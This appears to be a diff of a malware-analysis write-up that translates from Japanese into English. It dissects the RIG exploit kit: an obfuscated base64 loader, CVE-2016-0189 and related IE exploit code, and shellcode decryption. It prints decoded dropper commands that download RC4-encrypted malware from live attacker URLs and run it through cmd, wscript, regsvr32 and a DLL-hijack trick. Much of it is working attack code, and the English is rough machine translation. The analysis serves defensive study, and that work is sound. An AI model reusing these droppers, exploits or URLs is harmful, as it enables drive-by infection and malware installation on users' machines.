gdmFsdWU9InRydWUiLz4nOwoJa290ZCA9IGtvdGQgKyAnPHBhcmFtIG5hbWU9Rmxhc2hWYXJzIHZhbHVlPSJpZGRxZD0nICsgYXNkICsgJyIgLz4nOwoJa290ZCA9IGtvdGQgKyAnPCEtLVtpZiAhSUVdPi0tPic7Cglrb3RkID0ga290ZCArICc8b2JqZWN0IHR5cGU9ImFwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoIiBkYXRhPSInICsgZnVzICsgJyIgYWxsb3dTY3JpcHRBY2Nlc3M9YWx3YXlzIHdpZHRoPSIxMyIgaGVpZ2h0PSIxMyI+JzsKCWtvdGQgPSBrb3RkICsgJzxwYXJhbSBuYW1lPSJtb3ZpZSIgdmFsdWU9IicgKyBmdXMgKyAnIiAvPic7Cglrb3RkID0ga290ZCArICc8cGFyYW0gbmFtZT0icGxheSIgdmFsdWU9InRydWUiLz4nOwoJa290ZCA9IGtvdGQgKyAnPHBhcmFtIG5hbWU9Rmxhc2hWYXJzIHZhbHVlPSJpZGRxZD0nICsgYXNkICsgICAnIiAvPic7Cglrb3RkID0ga290ZCArICc8IS0tPCFbZW5kaWZdLS0+JzsKCWtvdGQgPSBrb3RkICsgJzwhLS1baWYgIUlFXT4tLT48L29iamVjdD48IS0tPCFbZW5kaWZdLS0+JzsKCWtvdGQgPSBrb3RkICsgJzwvb2JqZWN0Pic7CgoJdmFyIGdmZGcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKCWdmZGcuaW5uZXJIVE1MID0ga290ZDsKCWRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoZ2ZkZyk7Cgl9IAoJCglpeXRmZ2goImh0dHA6Ly9zaWRlLmNob2JhbmlhbmR5ci5jb20vP3E9em52UU12WGNKd0RRRG9QR012ckVTTHRFTVViUUEwS0syT0hfNzZxeUVvSDlKSFQxdnJEVVNrcnR0Z1dDZWxfJnF0dWlmPTM1NTkmb3E9WjhLQXVmN0pZT2dhdzMwQ0RjZ0l6bW9oVUFGMFQ4Ni1xaDBiZHp4LWRpTVRSLXh5OVpBMUc5NUNsVjdSOGpnJmN0PXNyb3VuZCIsIGdobnZibigiaHR0cDovL3NpZGUuY2hvYmFuaWFuZHlyLmNvbS8/cT16M3JRTXZYY0p3RFFEb1RGTXZyRVNMdEVNVV9PSEVLSzJPSF83ODNWQ1piOUpIVDF2dkhQUkFQd3RnV0NlbCZvcT1YVXB2Ql9LN0pZT2xLemlFYUpmQUl6bW9jUFZWb1g4YTJtaDBuVHdCZVUwOFNFLXlXRVpnOUZfYUxJVkxjNCZxdHVpZj01MjkzJmN0PWRpYW1vbmQiLCJnZXh5d29heG9yIikpOw==";var e={},i,b=0,c,x,aq=0,a,r="",dfgdfg=String.fromCharCode,L=s.length;var A="ABCDEFGHIJKSD454FLMNOPQRSTUVWXYSD454FZabcdefghijklmnopqrstuvwxyz0123456789+/"./*dfgdf*/replace(/SD454F/g, "");ch = "aTcharAt".substr(2); for(i=0;i<64;i++){/*fd54ed*/e[A[ch](i)]=i;}for(x=0;x<L;x++){c=e[/*fd54ed*/s[ch](x)];b=(b<<6)+c;aq+=6;bx=2;while(aq>=(9-1)){((a=(b>>>(aq-=8))&265-10)||(x<bx))&&(r+=dfgdfg(a));}}return r;}
 ```
 [https://gist.github.com/anonymous/d92f3be6bc24c4e8d6ceecfab066a393](https://gist.github.com/anonymous/d92f3be6bc24c4e8d6ceecfab066a393)
 
-Base64エンコードされた文字列を復号し実行しています. 実行されているコードは各セクションで以下のようになっています.
+It decodes and executes the Base64 encoded character string.The executed code is as follows in each section.
 
 ```vb
 
@@ -451,33 +449,32 @@ var hgfgghf = "";/*s3694d18305hfj38521fs*/var hggfgfgghf = "";/*s20980d64663hfj5
 ```
 [https://gist.github.com/anonymous/a00755dfe223da251f2aea4f92d69969](https://gist.github.com/anonymous/a00755dfe223da251f2aea4f92d69969)
 
-VBScriptやJavaScript, wfを読み込むコードです. これらのコードはブラウザなどの脆弱性を突くコードで, これらによってマルウェアがダウンロードされ, 実行されます.
+Code to read VBScript, JavaScript, wf These codes are code that exploit vulnerabilities such as browsers, which cause malware to be downloaded and executed.
 
-## User-Agentとペイロードの関係
-先ほど```RigEKはアクセスしてきたユーザの環境に合わせた(ブラウザやプラグインの脆弱性を突く）ペイロードを含む難読化されたデータをユーザに返します```と書きましたが, 実際の対応関係について紹介します.
-
-以下は私が2017年5月11日に, IE6~11を使ってRigEKへアクセスした際に取得したペイロードを元に作成した対応表です.
+## Relationship between User-Agent and payload
+Below is a correspondence table created based on the payload acquired when I accessed RigEK using IE 6 - 11 on May 11, 2017.
 
 ![13.jpg](http://i.imgur.com/JHrNrNJ.jpg)
 
-PDFバージョンは[こちら](rig_ua.pdf)にあります.
+The PDF version is in [here](rig_ua.pdf).
 
-(私はswfについて全く知識がないので, swfで利用されている脆弱性については調査していませんが, swfが読み込まれるコードが存在するかどうかをマークしています)
+(I have no knowledge of swf, so I have not investigated the vulnerabilities used in swf, but I have marked as to whether swf loads the code to read)
 
-RigEKはユーザから送られてくるリクエスト内のUser-Agentを利用して, ユーザの環境でpwn出来るようなペイロードを選んで送っていることが分かります.
+You can see that RigEK uses the User - Agent in the request sent from the user and sends a payload that can be pwned in the user 's environment.
 
-## ペイロードの紹介
+## Introduction of payload
 ### CVE-2016-0189
 >The Microsoft (1) JScript 5.8 and (2) VBScript 5.7 and 5.8 engines, as used in Internet Explorer 9 through 11 and other products, allow remote attackers to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site, aka "Scripting Engine Memory Corruption Vulnerability," a different vulnerability than CVE-2016-0187. 
 
 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-0189
 
 #### exploit (POC)
-1. ダミーのVBScriptClassインスタンスを作成する
-2. クラスインスタンスのアドレスを取得する
-3. クラスインスタンスからCSessionアドレスをリークする
-4. CSessionインスタンスからCOleScriptアドレスをリークする
-5. COleScriptのSafetyOptionを上書きする
+1. Create a dummy VBScriptClass instance
+2. Obtain the address of the class instance
+3. Leak CSession address from class instance
+4. Leak COleScript address from CSession instance
+5. Overwrite COleScript's SafetyOption
+
 
 ```vb
 Function exploit (arg1)
@@ -504,7 +501,7 @@ Function exploit (arg1)
 * https://www.exploit-db.com/exploits/40118/
 
 #### How to use in RIG
-RIGで観測されたexploitは2種類ありました. POCで公開されているコードとVBSの部分のコードはほぼ同等で, いくつかの難読化処理が見られます.
+There were two version of exploit observed by RIG. Code published in POC and code of VBS part are almost equal, and some obfuscation processing can be seen.
 
 ##### ver.1
 ###### exploit
@@ -528,8 +525,7 @@ End Function
 
 
 ###### execute
-実行するコマンドは難読化されています.
-
+The command to be executed is obfuscated.
 ```vb
         　Set w=CreateObject("WScript.Shell")
 	  key="gexywoaxor"
@@ -541,7 +537,7 @@ End Function
       w.Run str,0
 ```
 
-実行したコマンドをデコードすると以下のようになります.
+Decoding the executed command will result in the following.
 
 ```bat
 cmd.exe /q /c cd /d "%tmp%" && echo function O(l){var w="pow",j=37-1;return A.round((A[w](j,l+1)-A.random()*A[w](j,l))).toString(j)["slice"](1)};function V(k){var y=a(e+"."+e+"Request.5.1");y.setProxy(n);y.open("GET",k(1),1);y.Option(n)=k(2);y["send"]();y./*ABCDE*/WaitForResponse();if(200==y.status)return _(y.responseText,k(n))};function _(k,e){for(var l=0,n,c=[],F=256-1,S=String,q=[],b=0;256^>b;b++)c[b]=b;for(b=0;256^>b;b++)l=l+c[b]+e.charCodeAt(b%e.length)^&F,n=c[b],c[b]=c[l],c[l]=n;for(var p=l=b=0;p^<k.length;p++)b=b+1^&F,l=l+c[b]^&F,n=c[b],c[b]=c[l],c[l]=n,q.push(S.fromCharCode(k.charCodeAt(p)^^c[c[b]+c[l]^&F]));return q.join("")};try{var u=WScript,o="Object",A=Math,a=Function("b","return u.Create"+o+"(b)");P=(""+u).split(" ")[1],M="indexOf",q=a(P+"ing.FileSystem"+o),m=u.Arguments,e="WinHTTP",Z="cmd",j=a("W"+P+".Shell"),s=a("ADODB.Stream"),x=O(8)+".",p="exe",n=0,K=u[P+"FullName"],E="."+p;s.Type=2;s.Charset="iso-8859-1";s.Open();try{v=V(m)}catch(W){v=V(m)};d=v.charCodeAt(027+v[M]("PE\x00\x00"));s.WriteText(v);if(31^<d){var z=1;x+="dll"}else x+=p;s["savetofile"](x,2);s.Close();f="r";z^&^&(x="regsv"+f+32+E+" /s "+x);j.run(Z+E+" /c "+x,0)}catch(_x){};q.Deletefile(K);>o32.tmp && start wscript //B //E:JScript o32.tmp "gexywoaxor" "http://top.associatedorthopaedicsva.com/?oq=J5e7FSbAPkjkXTeQ1mmNsJVV0a9K-pjkTdzhLN1pPR_hOKZQxN-aKcHbAy0W2oj7kX&car=2125&policy=coffe&ct=sround&q=w3_QMvXcJxfQFYbGMvzDSKNbNkzWHViPxouG9MildZ2qZGX_k7XDfF-qoV3cCgWRxf&wendsday=sround.98wq59.406p2z1t1" "Navigator.UserAgent"
@@ -568,8 +564,7 @@ End Function
 ```
 
 ###### execute
-fire()では以下の処理が行われます. req.Sendで指定したURLからRC4エンコードされたマルウェアをダウンロードします.
-
+fire() performs the following processing: Download RC4-encoded malware from the URL specified by req.Send.
 ```vb
     url="http://set.associatedorthopedics.com/?policy=choko&oq=86V_KrRUbwTpiheDKgVimY1VBFpCpfunjhSBnUOe0ZOF9CWEaANM9pucHbkLhR32&wendsday=soul.127nr84.406c8b6h9&car=2243&q=z37QMvXcJwDQDoTHMvrESLtEMU_OHUKK2OH_783VCZv9JHT1vvHPRAPxtgWCel_Q&ct=soul"
     uas=Navigator.userAgent
@@ -588,8 +583,7 @@ fire()では以下の処理が行われます. req.Sendで指定したURLからR
     If 200=req.status Then
 ```
 
-req.statusが200(成功)ならば, fakedllを作成します.
-
+If req.status is 200(success), create fakedll.
 ```vb
 　　　　　　　dlltxt = Join(dllcode,"")
 　　　　　　　fakedll = c.BuildPath(fake32,"shell32.dll")            
@@ -598,7 +592,7 @@ req.statusが200(成功)ならば, fakedllを作成します.
 　　　　　　　b.Close
 ```
 
-さらにarcnsave()内でダウンロードしたマルウェアをデコードし, %tmp%以下の[ランダム8文字].exe生成します.
+Furthermore, it decodes the downloaded malware in arcnsave () and generates "[random 8 character].exe" under %tmp%.
 
 ```vb
 　　　　　　　f=c.BuildPath(tmp,rnds(8)&".exe")
@@ -610,7 +604,8 @@ req.statusが200(成功)ならば, fakedllを作成します.
             stream.Close
 ```
 
-作成した%tmp%以下の[ランダム8文字].exeを実行するための準備が行われます. 環境変数を設定し, ```CreateObject("Shell.Application")```で作成したdllを読みこませます.
+Preparation for executing the created exe is done Set the environment variable and read the dll created by ```CreateObject("Shell.Application")```.
+
 
 ```vb
             Set w=CreateObject("WScript.Shell")
@@ -622,17 +617,16 @@ req.statusが200(成功)ならば, fakedllを作成します.
             Environment("Process").Item("SystemRoot")=oldroot
 ```
 
-dllがマルウェアを実行されているようです.
-DllEntryPointではCreateProcessAsUserWが呼ばれていました.
+The dll seems to be running malware.
+CreateProcessAsUserW was called in DllEntryPoint.
 
 ![](https://i.imgur.com/sAVaJfi.png)
 
-
-しかし, lpCmmandLineの文字列はよくわからなかったので, 誰か詳しい人教えてください:pray:
+However, I did not understand the string of lpCmmandLine well, so please tell me if you know :pray:
 
 ![](https://i.imgur.com/GBShm6W.png)
 
-これは以下と同じ処理だと考えられます.
+This is considered the same process as below.
 
 >Nebula EK uses a technique published on BlackHat 2014 [2] to circumvent this problem. When you create a Shell.Application object, IE loads% systemroot% \ system32 \ shell32.dll. Normally% systemroot% is c: \ windows directory. However, an attacker can perform DLL hijacking attacks as follows.
 >
@@ -697,7 +691,7 @@ end function
 * https://www.exploit-db.com/exploits/35229/
 
 #### How to use in RIG
-CVE-2016-0189と併用して利用されるため, 実行されるコマンドはほとんど一緒です. いくつかの変数の値が異なっていました.
+Because it is used in conjunction with CVE-2016-0189, the commands to be executed are mostly the same, the values of some variables were different.
 
 ##### exploit
 ```vb
@@ -759,7 +753,7 @@ CVE-2016-0189と併用して利用されるため, 実行されるコマンド�
 		w.Run str,0
 ```
 
-デコードすると以下のようになります.
+Decoding it will be as follows.
 
 ```vb
 cmd.exe /q /c cd /d "%tmp%" && echo function O(l){var w="pow",j=37-1;return A.round((A[w](j,l+1)-A.random()*A[w](j,l))).toString(j)["slice"](1)};function V(k){var y=a(e+"."+e+"Request.5.1");y.setProxy(n);y.open("GET",k(1),1);y.Option(n)=k(2);y["send"]();y./*ABCDE*/WaitForResponse();if(200==y.status)return _(y.responseText,k(n))};function _(k,e){for(var l=0,n,c=[],F=256-1,S=String,q=[],b=0;256^>b;b++)c[b]=b;for(b=0;256^>b;b++)l=l+c[b]+e.charCodeAt(b%e.length)^&F,n=c[b],c[b]=c[l],c[l]=n;for(var p=l=b=0;p^<k.length;p++)b=b+1^&F,l=l+c[b]^&F,n=c[b],c[b]=c[l],c[l]=n,q.push(S.fromCharCode(k.charCodeAt(p)^^c[c[b]+c[l]^&F]));return q.join("")};try{var u=WScript,o="Object",A=Math,a=Function("b","return u.Create"+o+"(b)");P=(""+u).split(" ")[1],M="indexOf",q=a(P+"ing.FileSystem"+o),m=u.Arguments,e="WinHTTP",Z="cmd",j=a("W"+P+".Shell"),s=a("ADODB.Stream"),x=O(8)+".",p="exe",n=0,K=u[P+"FullName"],E="."+p;s.Type=2;s.Charset="iso-8859-1";s.Open();try{v=V(m)}catch(W){v=V(m)};d=v.charCodeAt(027+v[M]("PE\x00\x00"));s.WriteText(v);if(31^<d){var z=1;x+="dll"}else x+=p;s["savetofile"](x,2);s.Close();f="r";z^&^&(x="regsv"+f+32+E+" /s "+x);j.run(Z+E+" /c "+x,0)}catch(_x){};q.Deletefile(K);>o32.tmp && start wscript //B //E:JScript o32.tmp "gexywoaxor" "http://top.associatedorthopaedicsva.com/?wendsday=kulture.89pp107.406l7j6x4&oq=2Fo_EuL-NVPgOyi0eHf1A1m4dfUVwU96GpikCEn0WfhpCG9B2LUQNM9qKQSfE4&q=wX7QMvXcJwDQCIbGMvrESLtENknQA0KK2Iv2_dqyEoH9eGnihNzUSkrz6B2aCm&policy=choko&ct=kulture&car=1801" "Navigator.UserAgent"
@@ -792,7 +786,7 @@ Il1I4['prototype'].yc =
 ```
 
 #### How to use in RIG
-全体的に読みにくく書かれています. FireEyeの記事で書かれていたjsより, 少し難読化されていました.
+Overall it is hard to read, it was slightly obfuscated from js written in FireEye's article.
 
 ##### exploit
 ```js
@@ -824,14 +818,15 @@ Il1I4['prototype'].yc =
     }
 ```
 
+Appendix III of FireEye's article
 
-FireEyeの記事のAppendix III
 
 ```js
 {"ll":"length","l":"charCodeAt","I":"fromCharCode","Il":"floor","IlI":"random","lI":"stringify","lII":"location","II":"host","llI":"number","lll":"ScriptEngineBuildVersion","lIl":"ScriptEngineMajorVersion","IIl":"ScriptEngineMinorVersion","Ill":"setInterval","III":"clearInterval","lIlI":"ur0pqm8kx”,"IlII":"http://","lllI":","lIIl":"u","IlIl":"x","llll":"xexec","Illl":"EAX","lIII":"ECX","IIIl":"EDI","IllI":"ESP","IIlI":"XCHG EAX,ESP","IIll":"MOV [ECX+0C],EAX","llIl":"CALL [EAX+4C]","llII":"MOV EDI,[EAX+90]","IIII":"a","lIll":"kernel32.dll","lIlll":"virtualprotect","IIIlI":11,"lIIll":0,"lllll":17905,"lIllI":500,"llIIl":16,"IlIII":0,"IIIll":1,"IIlII":2,"lIlII":3,"IllIl":4,"lllIl":5,"IIlll":8,"lIlIl":9,"lIIIl":10,"IllII":11,"lIIlI":12,"IlIll":16,"IIIIl":24,"IlIlI":100,"IIIII":1,"llIlI":2,"lllII":2147483647,"llIll":4294967295,"IIllI":255,"llIII":256,"lIIII":65535,"IIlIl":16776960,"IlIIl":16777215,"llllI":4294967040,"IlllIl":4294901760,"Illll":4278190080,"IlllI":65280,"llllIl":16711680,"lllIlI":19,"llIIII":4096,"IIIIIl":4294963200,"IIlllI":4095,"llIIlI":14598366,"IIllIl":48,"llIIll":32,"IIIllI":15352,"llIlll":85,"lIIIII":4096,"IllllI":400,"lIIlII":311296000,"IIIlIl":61440,"llllII":24,"IIIIll":32,"IlIlIl":17239,"lllllI":15,"IllIll":256,"llIllI":76,"lllIll":144,"lIlIIl":17416,"IlIIll":65536,"IIlIll":100000,"lIlllI":28,"IIlIlI":60,"lIlIII":44,"IIIlll":28,"IllIII":128,"lllIIl":20,"lIIIll":12,"lIlIlI":16,"IIlIIl":4,"IlIIIl":2,"lIllll":110,"IIIlII":64,"IllIlI":-,"lIIIIl":0,"IllIlII":1,"lIIlll":2,"IlIlll":3,"IIlIII":4,"lIllIl":5,"IIllll":7,"IIIIII":9,"lIlIll":10,"IlllII":11,"lIllII":12,"Illlll":-2146823286,"lIIIlI":[148,195],"lIIlIl":[137,65,12,195],"IIllII":122908,122236,125484,2461125,208055,1572649,249826,271042,98055,62564,162095,163090,340146,172265,163058,170761,258290,166489,245298,172955,82542],"IlIIII":150104,149432,152680,3202586,214836,3204663,361185,285227,103426,599295,365261,226292,410596,180980,226276,179716,320389,175621,307381,792144,183476],"IIIIlI":48,"IIIlIlI":57,"lllIII":65,"IllIIl":90,"IlIlII":97,"llllll":122,"IlIllI":16640,"llIlIl":23040,"IlIIlI":4259840,"lIIIIlI":5898240,"llIIIl":1090519040,"llIIIII":1509949440,"IlIIIlI":32,"IIIlllI":8192,"lllllII":2097152,"IIIllll":536870912,"llIlII":"17416":4080636,"17496":4080636,"17631":4084748,"17640":4084748,"17689":4080652,"17728":4088844,"17801":4088844,"17840":4088840,"17905":4088840
 ```
 
-RIGのペイロードでは"l"を"ER"に変換しています.
+In RIG's payload, "l" is converted to "ER".
+
 
 ```js
 n = '{"ERER":"EReYTgth","ER":"charCodeAt","I":"fromCharCode","IER":"fERoor","IERI":"raYTdom","ERI":"striYTgify","ERII":"ERocatioYT","II":"host","ERERI":"YTumber","ERERER":"ScriptEYTgiYTeBuiERdVersioYT","ERIER":"ScriptEYTgiYTeMajorVersioYT","IIER":"ScriptEYTgiYTeMiYTorVersioYT","IERER":"setIYTtervaER","III":"cERearIYTtervaER","ERIERI":"ur0pqm8kx","IERII":"http://","ERERERI":"ERocaERhost/","ERIIER":"u","IERIER":"x","ERERERER":"xexec","IERERER":"EAX","ERIII":"ECX","IIIER":"EDI","IERERI":"ESP","IIERI":"XCHG EAX,ESP","IIERER":"MOV [ECX+0C],EAX","ERERIER":"CAERER [EAX+4C]","ERERII":"MOV EDI,[EAX+90]","IIII":"a","ERIERER":"kerYTeER32.dERER","ERIERERER":"virtuaERprotect","IIIERI":11,"ERIIERER":0,"ERERERERER":17905,"ERIERERI":500,"ERERIIER":16,"IERIII":0,"IIIERER":1,"IIERII":2,"ERIERII":3,"IERERIER":4,"ERERERIER":5,"IIERERER":8,"ERIERIER":9,"ERIIIER":10,"IERERII":11,"ERIIERI":12,"IERIERER":16,"IIIIER":24,"IERIERI":100,"IIIII":1,"ERERIERI":2,"ERERERII":2147483647,"ERERIERER":4294967295,"IIERERI":255,"ERERIII":256,"ERIIII":65535,"IIERIER":16776960,"IERIIER":16777215,"ERERERERI":4294967040,"IERERERIER":4294901760,"IERERERER":4278190080,"IERERERI":65280,"ERERERERIER":16711680,"ERERERIERI":19,"ERERIIII":4096,"IIIIIER":4294963200,"IIERERERI":4095,"ERERIIERI":14598366,"IIERERIER":48,"ERERIIERER":32,"IIIERERI":15352,"ERERIERERER":85,"ERIIIII":4096,"IERERERERI":400,"ERIIERII":311296000,"IIIERIER":61440,"ERERERERII":24,"IIIIERER":32,"IERIERIER":17239,"ERERERERERI":15,"IERERIERER":256,"ERERIERERI":76,"ERERERIERER":144,"ERIERIIER":17416,"IERIIERER":65536,"IIERIERER":100000,"ERIERERERI":28,"IIERIERI":60,"ERIERIII":44,"IIIERERER":28,"IERERIII":128,"ERERERIIER":20,"ERIIIERER":12,"ERIERIERI":16,"IIERIIER":4,"IERIIIER":2,"ERIERERERER":110,"IIIERII":64,"IERERIERI":-1,"ERIIIIER":0,"IERERIERII":1,"ERIIERERER":2,"IERIERERER":3,"IIERIII":4,"ERIERERIER":5,"IIERERERER":7,"IIIIII":9,"ERIERIERER":10,"IERERERII":11,"ERIERERII":12,"IERERERERER":-2146823286,"ERIIIERI":[148,195],"ERIIERIER":[137,65,12,195],"IIERERII":[122908,122236,125484,2461125,208055,1572649,249826,271042,98055,62564,162095,163090,340146,172265,163058,170761,258290,166489,245298,172955,82542],"IERIIII":[150104,149432,152680,3202586,214836,3204663,361185,285227,103426,599295,365261,226292,410596,180980,226276,179716,320389,175621,307381,792144,183476],"IIIIERI":48,"IIIERIERI":57,"ERERERIII":65,"IERERIIER":90,"IERIERII":97,"ERERERERERER":122,"IERIERERI":16640,"ERERIERIER":23040,"IERIIERI":4259840,"ERIIIIERI":5898240,"ERERIIIER":1090519040,"ERERIIIII":1509949440,"IERIIIERI":32,"IIIERERERI":8192,"ERERERERERII":2097152,"IIIERERERER":536870912,"ERERIERII":{"17416":4080636,"17496":4080636,"17631":4084748,"17640":4084748,"17689":4080652,"17728":4088844,"17801":4088844,"17840":4088840,"17905":4088840}}'.replace(/ER/g, "l").replace(/YT/g, "n"), 
@@ -839,7 +834,7 @@ n = '{"ERER":"EReYTgth","ER":"charCodeAt","I":"fromCharCode","IER":"fERoor","IER
 
 ##### shellcode
 ###### 1. Shellcode Decryption Stage
-RC4で暗号化され, base64でエンコードされています.
+It is encrypted with RC4 and encoded with base64.
 
 ```
 this.scope.Ua = "ur0pqm8kx" = RC4 key
@@ -920,10 +915,10 @@ function Il1I$() {
         this.Za = new Il1I9(""[this.scope.Xc](), "Du9JOBgkbfzGvmFF");
 ```
 
-## さいごに
-以上がこれまで私が観測してきたRigEKの姿です. Drive-by Download攻撃及びExploit Kitは高度に進化し, 今後も多くの被害をもたらすのではないかと危惧されています. RigEKも今後より高度に進化していくでしょう. この記事を読むことで「Drive-by Download攻撃が実際にどのように行われているのか」「Exploit Kitとは何なのか」, 少しでも知ることが出来れば幸いです.
+## Finally
+This is the form of RigEK that I have observed so far. If the advanced Drive-by Download Attack and Exploit Kit evolved highly, I am worried that it will cause many damage in the future. RigEK will be more advanced in the futur. I would be pleased if you read this article, you will be able to know even a little "How is the Drive-by Download Attack actually done?" "What is the Exploit Kit?"
 
-## 参考文献
+## References
 - [Take the RIG Pill: Down the Rabbit Hole](http://blog.talosintelligence.com/2016/11/rig-exploit-kit-campaign-happy-puzzling.html)
 - [RIG EK - Chronology of an Exploit Kit](https://community.rsa.com/community/products/netwitness/blog/2017/02/01/rig-ek-chronology-of-an-exploit-kit)
 - [Campaign Evolution: pseudo-Darkleech in 2016](http://researchcenter.paloaltonetworks.com/2016/12/unit42-campaign-evolution-pseudo-darkleech-2016/)
